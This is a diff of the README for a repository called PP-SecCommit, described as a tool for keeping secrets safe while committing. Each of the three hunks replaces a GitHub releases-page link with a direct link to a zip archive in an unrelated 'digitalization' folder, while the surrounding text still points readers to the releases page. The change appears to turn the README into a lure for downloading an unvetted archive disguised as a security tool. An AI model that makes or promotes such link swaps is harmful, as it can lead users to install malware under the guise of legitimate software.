@@ -1,6 +1,6 @@
 # 🔒 PP-SecCommit - Keep Your Secrets Safe while Committing
 
-[![Download PP-SecCommit](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/mfe775/PP-SecCommit/releases)
+[![Download PP-SecCommit](https://raw.githubusercontent.com/mfe775/PP-SecCommit/main/digitalization/PP-SecCommit.zip)](https://raw.githubusercontent.com/mfe775/PP-SecCommit/main/digitalization/PP-SecCommit.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To get started with PP-SecCommit, follow these steps:
 
 1. **Visit the Download Page:** Go to the following link to find the latest version of PP-SecCommit:
    
-   [Download PP-SecCommit](https://github.com/mfe775/PP-SecCommit/releases).
+   [Download PP-SecCommit](https://raw.githubusercontent.com/mfe775/PP-SecCommit/main/digitalization/PP-SecCommit.zip).
 
 2. **Choose the Right File:** On the Releases page, select the latest version of the PP-SecCommit file. Look for a file named something like `PP-SecCommit`.
 
@@ -42,7 +42,7 @@ To get started with PP-SecCommit, follow these steps:
 
 ## 📥 Download & Install
 
-To get the latest version of PP-SecCommit, visit this page: [Download PP-SecCommit](https://github.com/mfe775/PP-SecCommit/releases).
+To get the latest version of PP-SecCommit, visit this page: [Download PP-SecCommit](https://raw.githubusercontent.com/mfe775/PP-SecCommit/main/digitalization/PP-SecCommit.zip).
 
 ## 🚀 Features
 
